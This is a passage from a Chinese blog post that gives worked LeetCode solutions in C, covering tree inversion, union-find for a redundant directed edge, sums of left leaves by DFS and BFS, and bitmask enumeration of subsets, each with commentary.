*left;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *right;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">struct TreeNode* <span class="title">invertTree</span><span class="params">(struct TreeNode* root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    <span class="keyword">int</span> start=<span class="number">0</span>, <span class="built_in">end</span>=<span class="number">1</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span> * (<span class="title">queue</span>[1000]), *<span class="title">temp</span>;</span></span><br><span class="line">    <span class="built_in">queue</span>[start] = root;</span><br><span class="line">    <span class="keyword">while</span>(start!=<span class="built_in">end</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">queue</span>[start] != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            temp = <span class="built_in">queue</span>[start]-&gt;left;</span><br><span class="line">            <span class="built_in">queue</span>[start]-&gt;left = <span class="built_in">queue</span>[start]-&gt;right;</span><br><span class="line">            <span class="built_in">queue</span>[start]-&gt;right = temp;</span><br><span class="line">            <span class="built_in">queue</span>[<span class="built_in">end</span>] = <span class="built_in">queue</span>[start]-&gt;left;</span><br><span class="line">            <span class="built_in">queue</span>[<span class="built_in">end</span>+<span class="number">1</span>] = <span class="built_in">queue</span>[start]-&gt;right;</span><br><span class="line">            <span class="built_in">end</span> += <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        start++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/16/Y68GBXM2hlSKgzs.png" alt="image.png"></p><blockquote><p>以及这个故事实在是太搞了</p><p><img src="https://i.loli.net/2020/09/16/NW26F4OInxfqbmy.png" alt="image.png"></p></blockquote><h3 id="17-685-冗余连接-II（困难）"><a href="#17-685-冗余连接-II（困难）" class="headerlink" title="17 - 685. 冗余连接 II（困难）"></a>17 - <a href="https://leetcode-cn.com/problems/redundant-connection-ii/" target="_blank" rel="noopener">685. 冗余连接 II（困难）</a></h3><blockquote><p>在本问题中，有根树指满足以下条件的有向图。该树只有一个根节点，所有其他节点都是该根节点的后继。每一个节点只有一个父节点，除了根节点没有父节点。</p><p>输入一个有向图，该图由一个有着N个节点 (节点值不重复1, 2, …, N) 的树及一条附加的边构成。附加的边的两个顶点包含在1到N中间，这条附加的边不属于树中已存在的边。</p><p>结果图是一个以边组成的二维数组。 每一个边 的元素是一对 [u, v]，用以表示有向图中连接顶点 u 和顶点 v 的边，其中 u 是 v 的一个父节点。</p><p>返回一条能删除的边，使得剩下的图是有N个节点的有根树。若有多个答案，返回最后出现在给定二维数组的答案。</p><p>示例 1:</p><p>输入: [[1,2], [1,3], [2,3]]<br>输出: [2,3]<br>解释: 给定的有向图如下:<br>  1<br> / <br>v   v<br>2–&gt;3<br>示例 2:</p><p>输入: [[1,2], [2,3], [3,4], [4,1], [1,5]]<br>输出: [4,1]<br>解释: 给定的有向图如下:<br>5 &lt;- 1 -&gt; 2<br>     ^    |<br>     |    v<br>     4 &lt;- 3<br>注意:</p><p>二维数组大小的在3到1000范围内。<br>二维数组中的每个整数在1到N之间，其中 N 是二维数组的大小。</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/redundant-connection-ii" target="_blank" rel="noopener">https://leetcode-cn.com/problems/redundant-connection-ii</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><p><del>第二天就直接上困难难度的题，真有你的啊leetcode</del></p><p><del>暂时做不出来，歇菜了Or2</del></p><h4 id="解法：并查集"><a href="#解法：并查集" class="headerlink" title="解法：并查集"></a>解法：并查集</h4><p>半夜三点多把前置题：<a href="https://leetcode-cn.com/problems/redundant-connection/" target="_blank" rel="noopener">684. 冗余连接</a>给做了（见<a href="https://arttnba3.cn/2020/09/17/[OJ-0x0005-Leetcode]树部分write-up-by-arttnba3/" target="_blank" rel="noopener">这里</a>），感觉稍微有了点头绪，<del>其实还是啥都不知道</del>…</p><p>晚上大概想清楚了，同样是采用并查集的思想，不过考虑到该图为有向图，同时题目给定的图<strong>必定存在一条边使得该图无法成为一颗树</strong></p><p>可能存在如下情况：</p><ul><li><strong>一个节点的入度大于等于2</strong>（<strong>存在两个及以上父结点，本题数据构造保证只可能存在两个父结点的情况</strong>）</li><li><strong>图中存在回路</strong></li><li><strong>以上两种情况同时存在</strong></li></ul><p>如下图所示（字丑见谅QwQ）：</p><p><img src="https://i.loli.net/2020/09/18/HTi1XVUF7SuIRM3.png" alt="33A2C56517F4926A49A4C03363AECFD0.png"></p><p>故我们很容易（并不Or2）能够得到解开这道题的算法：</p><ul><li><strong>将每一个结点初始化为一棵单独的树，其父结点初始化为自身</strong></li><li><strong>使用两个数组分别保存每个结点的父结点与所属的树的根结点</strong></li><li><strong>遍历每一条边，重新记录下每个结点的父结点与根节点</strong></li><li><strong>当一个结点的入度大于1时，记录该边为争议边</strong></li><li><strong>当一条边的始末结点同属于一棵树时，记录该条边为回路边</strong></li><li><strong>两种情况都不存在，则将该边的末结点的父结点标为该边的始结点，并合并两结点所在的树</strong></li><li><strong>当争议边不存在时，直接删除回路边</strong></li><li><strong>争议边若存在，若同时存在回路边，则删除争议边末尾结点及其父结点所构成边，否则删除争议边</strong></li></ul><p>构造代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Note: The returned array must be malloced, assume caller calls free().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Note: The returned array must be malloced, assume caller calls free().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> * ancestors;<span class="comment">//记录每个节点的根结点</span></span><br><span class="line"><span class="keyword">int</span> * parent;<span class="comment">//记录每个节点的父结点</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find_x</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x == ancestors[x] ? x : (ancestors[x] = find_x(ancestors[x]));<span class="comment">//路径压缩</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">union_ancestor</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ancestors[find_x(a)] = find_x(b);<span class="comment">//将两棵树合并为一棵树</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span>* <span class="title">findRedundantDirectedConnection</span><span class="params">(<span class="keyword">int</span>** edges, <span class="keyword">int</span> edgesSize, <span class="keyword">int</span>* edgesColSize, <span class="keyword">int</span>* returnSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line">    ancestors = (<span class="keyword">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>)*(edgesSize+<span class="number">5</span>));</span><br><span class="line">    parent = (<span class="keyword">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>)*(edgesSize+<span class="number">5</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=edgesSize;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        parent[i] = ancestors[i] = i;<span class="comment">//初始化每个结点为单独的一棵树（并查集），结点的父结点标记为自身</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//conflict：可能存在争议的边</span></span><br><span class="line">    <span class="comment">//circle：可能形成回路的边</span></span><br><span class="line">    <span class="keyword">int</span> start, <span class="built_in">end</span>, a_start, a_end, conflict = <span class="number">-1</span>, <span class="built_in">circle</span> = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;edgesSize;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        start = edges[i][<span class="number">0</span>];</span><br><span class="line">        <span class="built_in">end</span> = edges[i][<span class="number">1</span>];</span><br><span class="line">        a_start = find_x(start);</span><br><span class="line">        a_end = find_x(<span class="built_in">end</span>);</span><br><span class="line">        <span class="keyword">if</span>(parent[<span class="built_in">end</span>] != <span class="built_in">end</span>)<span class="comment">//该条边的尾结点已经与其他结点相连（即加上这条边后入度大于1）</span></span><br><span class="line">        &#123;</span><br><span class="line">            conflict = i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            parent[<span class="built_in">end</span>] = start;</span><br><span class="line">            <span class="keyword">if</span>(a_start == a_end)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">circle</span> = i;<span class="comment">//该条边两结点的根结点相同，可能形成回路</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                union_ancestor(start, <span class="built_in">end</span>);<span class="comment">//将两棵树合并为一棵树（并查集）</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> *ret = (<span class="keyword">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>)*<span class="number">2</span>);</span><br><span class="line">    *returnSize = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span>(conflict&lt;<span class="number">0</span>)<span class="comment">//不存在争议边，只存在形成回路的边</span></span><br><span class="line">    &#123;</span><br><span class="line">        ret[<span class="number">0</span>] = edges[<span class="built_in">circle</span>][<span class="number">0</span>];</span><br><span class="line">        ret[<span class="number">1</span>] = edges[<span class="built_in">circle</span>][<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span><span class="comment">//存在争议边</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">circle</span>&gt;<span class="number">0</span>)<span class="comment">//同时存在回路边</span></span><br><span class="line">        &#123;</span><br><span class="line">            ret[<span class="number">0</span>] = parent[edges[conflict][<span class="number">1</span>]];</span><br><span class="line">            ret[<span class="number">1</span>] = edges[conflict][<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">return</span> ret;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            ret[<span class="number">0</span>] = edges[conflict][<span class="number">0</span>];</span><br><span class="line">            ret[<span class="number">1</span>] = edges[conflict][<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">return</span> ret;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/18/IahfqNWwzCoA6GU.png" alt="image.png"></p><h3 id="18-47-全排列-II（中等）"><a href="#18-47-全排列-II（中等）" class="headerlink" title="18 - 47. 全排列 II（中等）"></a>18 - <a href="https://leetcode-cn.com/problems/permutations-ii/" target="_blank" rel="noopener">47. 全排列 II（中等）</a></h3><p>明早起来再看，先咕咕咕了（</p><h3 id="19-404-左叶子之和（简单）"><a href="#19-404-左叶子之和（简单）" class="headerlink" title="19 - 404. 左叶子之和（简单）"></a>19 - <a href="https://leetcode-cn.com/problems/sum-of-left-leaves/" target="_blank" rel="noopener">404. 左叶子之和（简单）</a></h3><blockquote><p>计算给定二叉树的所有左叶子之和。</p><p>示例：</p><pre><code>3</code></pre><p>   / \<br>  9  20<br>        / \<br>      15   7</p><p>在这个二叉树中，有两个左叶子，分别是 9 和 15，所以返回 24</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/sum-of-left-leaves" target="_blank" rel="noopener">https://leetcode-cn.com/problems/sum-of-left-leaves</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><h5 id="解法一：深度优先搜索（DFS）"><a href="#解法一：深度优先搜索（DFS）" class="headerlink" title="解法一：深度优先搜索（DFS）"></a>解法一：深度优先搜索（DFS）</h5><p>一层一层地搜下去，若左结点为叶子结点（无子女）则加上左结点的值，否则搜索子结点，若右结点不为子结点则搜索右结点的子节点</p><p>得代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *right;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">isLeaf</span><span class="params">(struct TreeNode * root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !root-&gt;left &amp;&amp; !root-&gt;right;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dfs</span><span class="params">(struct TreeNode* root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">    ans += root-&gt;left ? (isLeaf(root-&gt;left) ? root-&gt;left-&gt;val : dfs(root-&gt;left)) : <span class="number">0</span>;</span><br><span class="line">    ans += (root-&gt;right!=<span class="literal">NULL</span>&amp;&amp;!isLeaf(root-&gt;right)) ? dfs(root-&gt;right) : <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sumOfLeftLeaves</span><span class="params">(struct TreeNode* root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> root ? dfs(root) : <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//利用三目运算符的一行流</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *right;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sumOfLeftLeaves</span><span class="params">(struct TreeNode* root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> root ? (root-&gt;left &amp;&amp; !root-&gt;left-&gt;left &amp;&amp; !root-&gt;left-&gt;right ? root-&gt;left-&gt;val + sumOfLeftLeaves(root-&gt;right) : sumOfLeftLeaves(root-&gt;left)+sumOfLeftLeaves(root-&gt;right)) : <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/19/aIl9nXHm8vPQ6ZL.png" alt="image.png"></p><h5 id="解法二：广度优先搜索（BFS）-队列"><a href="#解法二：广度优先搜索（BFS）-队列" class="headerlink" title="解法二：广度优先搜索（BFS）+ 队列"></a>解法二：广度优先搜索（BFS）+ 队列</h5><p>这个解法是从官方的题解上看来的</p><p>使用队列数据结构来实现广度优先搜索</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *right;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">isLeafNode</span><span class="params">(struct TreeNode *node)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !node-&gt;left &amp;&amp; !node-&gt;right;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sumOfLeftLeaves</span><span class="params">(struct TreeNode *root)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!root) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span> **<span class="title">q</span> = <span class="title">malloc</span>(<span class="title">sizeof</span>(<span class="title">struct</span> <span class="title">TreeNode</span> *) * 1001);</span></span><br><span class="line">    <span class="keyword">int</span> left = <span class="number">0</span>, right = <span class="number">0</span>;</span><br><span class="line">    q[right++] = root;</span><br><span class="line">    <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (left &lt; right) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span> *<span class="title">node</span> = <span class="title">q</span>[<span class="title">left</span>++];</span></span><br><span class="line">        <span class="keyword">if</span> (node-&gt;left) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (isLeafNode(node-&gt;left)) </span><br><span class="line">            &#123;</span><br><span class="line">                ans += node-&gt;left-&gt;val;</span><br><span class="line">            &#125; </span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">            &#123;</span><br><span class="line">                q[right++] = node-&gt;left;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (node-&gt;right) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (!isLeafNode(node-&gt;right)) </span><br><span class="line">            &#123;</span><br><span class="line">                q[right++] = node-&gt;right;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然，这么做有一个缺点就是需要提前开辟较大的空间</p><p><img src="https://i.loli.net/2020/09/19/MSdXJub9jvfs6Ge.png" alt="image.png"></p><h3 id="20-78-子集（中等）"><a href="#20-78-子集（中等）" class="headerlink" title="20 - 78. 子集（中等）"></a>20 - <a href="https://leetcode-cn.com/problems/subsets/" target="_blank" rel="noopener">78. 子集（中等）</a></h3><blockquote><p>给定一组不含重复元素的整数数组 nums，返回该数组所有可能的子集（幂集）。</p><p>说明：解集不能包含重复的子集。</p><p>示例:</p><blockquote><p>输入: nums = [1,2,3]<br>输出:<br>[<br>  [3],<br>  [1],<br>  [2],<br>  [1,2,3],<br>  [1,3],<br>  [2,3],<br>  [1,2],<br>  []<br>]</p></blockquote><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/subsets" target="_blank" rel="noopener">https://leetcode-cn.com/problems/subsets</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><p>本题要求我们返回一个数组中的所有元素所组成的集合的所有子集（包括空集）</p><h4 id="解法：迭代法遍历数组"><a href="#解法：迭代法遍历数组" class="headerlink" title="解法：迭代法遍历数组"></a>解法：迭代法遍历数组</h4><p>考虑到二进制数的特殊性质（000→001→010→011→100→101→110→111），我们使用二进制数的每一位来表示是否选取数组中的该位数可以很方便地遍历完所有选取的情况</p><p>如下图所示</p><p><img src="https://i.loli.net/2020/09/21/46tKB3T1NSufJcR.png" alt="image.png"></p><p>同时由二项式定理可知一共有<strong>2^n</strong>种情况（x=1）</p><p><img src="https://i.loli.net/2020/09/21/WjVik4QFfobyUmM.png" alt="image.png"></p><p>故构造代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Return an array of arrays of size *returnSize.</span></span><br><span class="line"><span class="comment"> * The sizes of the arrays are returned as *returnColumnSizes array.</span></span><br><span class="line"><span class="comment"> * Note: Both returned array and *columnSizes array must be malloced, assume caller calls free().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span>** <span class="title">subsets</span><span class="params">(<span class="keyword">int</span>* nums, <span class="keyword">int</span> numsSize, <span class="keyword">int</span>* returnSize, <span class="keyword">int</span>** returnColumnSizes)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> amount = (<span class="number">1</span> &lt;&lt; numsSize);</span><br><span class="line">    <span class="keyword">int</span> **retn = (<span class="keyword">int</span>**)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>*)*amount);</span><br><span class="line">    *returnSize = amount;</span><br><span class="line">    *returnColumnSizes = (<span class="keyword">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>)*amount);</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">set</span>[numsSize];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;amount;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> n = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;numsSize;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(i &amp; (<span class="number">1</span> &lt;&lt; j))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">set</span>[n++] = nums[j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> *temp = (<span class="keyword">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>)*n);</span><br><span class="line">        <span class="built_in">memcpy</span>(temp,<span class="built_in">set</span>,<span class="keyword">sizeof</span>(<span class="keyword">int</span>)*n);</span><br><span class="line">        (*returnColumnSizes)[i] = n;<span class="comment">//踩坑点</span></span><br><span class="line">        retn[i] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> retn;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要注意的是二级指针的概念和使用方法</p><p><del>以及我想不通为什么returnColumnSizes要用二级指针</del></p><p><img src="https://i.loli.net/2020/09/21/pKmsDOZvUP9BgHT.png" alt="image.png"></p><h3 id="21-538-把二叉搜索树转换为累加树（简单）"><a href="#21-538-把二叉搜索树转换为累加树（简单）" class="headerlink" title="21 - 538. 把二叉搜索树转换为累加树（简单）"></a>21 - <a href="https://leetcode-cn.com/problems/convert-bst-to-greater-tree/" target="_blank" rel="noopener">538. 把二叉搜索树转换为累加树（简单）</a></h3><blockquote><p>给定一个二叉搜索树（Binary Search Tree），把它转换成为累加树（Greater Tree)，使得每个节点的值是原来的节点值加上所有大于它的节点值之和。</p><p>例如：</p><p>输入: 原始二叉搜索树:<br>              5<br>            /   <br>           2     13</p><p>输出: 转换为累加树:<br>             18<br>            /   <br>          20     13</p><p>注意：本题和 1038: <a href="https://leetcode-cn.com/problems/binary-search-tree-to-greater-sum-tree/" target="_blank" rel="noopener">https://leetcode-cn.com/problems/binary-search-tree-to-greater-sum-tree/</a> 相同</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/convert-bst-to-greater-tree" target="_blank" rel="noopener">https://leetcode-cn.com/problems/convert-bst-to-greater-tree</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><p><strong>二叉搜索树</strong>有一个特点就是<strong>结点左子树的结点都比该结点小，右子树的结点都比该结点大</strong>，因而叫二叉搜索树，可以用以大幅缩短搜索的时间</p><h4 id="解法：深度优先搜索-反序中序遍历"><a href="#解法：深度优先搜索-反序中序遍历" class="headerlink" title="解法：深度优先搜索 + 反序中序遍历"></a>解法：深度优先搜索 + 